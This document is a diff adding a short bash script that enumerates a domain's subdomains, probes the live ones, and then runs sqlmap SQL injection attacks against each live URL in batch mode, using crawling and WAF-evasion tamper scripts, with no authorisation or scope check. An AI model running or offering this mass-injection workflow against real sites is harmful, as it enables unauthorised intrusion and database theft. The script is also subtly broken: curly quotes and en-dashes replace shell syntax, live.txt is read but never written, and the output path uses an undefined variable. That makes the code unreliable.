@@ -1,0 +1,23 @@
+#!/bin/bash
+echo “Enter domain: ”
+read a
+assetfinder $a | sort -u > t1.txt
+subfinder -d $a | sort -u > t2.txt
+cat t1.txt t2.txt | sort -u > res.txt
+echo “Unique domains:”
+cat res.txt
+echo
+echo “Live domains are:”
+httpx -silent -follow-redirects -mc 200 live.txt
+echo “Do you want to perform SQL injection? Press ‘1’ for yes, ‘2’ for no:”
+read r
+if [ “$r” == “1” ]; then
+echo “Starting SQL injection tests…”
+while IFS= read -r url
+do
+echo “Testing URL: $url”
+sqlmap -u “$url” –crawl 5 –level 3 –tamper=space2comment,between,randomcase –batch -o “/home/usman/sqlmap_result_$url_.txt” # Execute sqlmap command for the current URL
+done < "live.txt"
+else
+echo "No SQL injection tests will be performed."
+fi
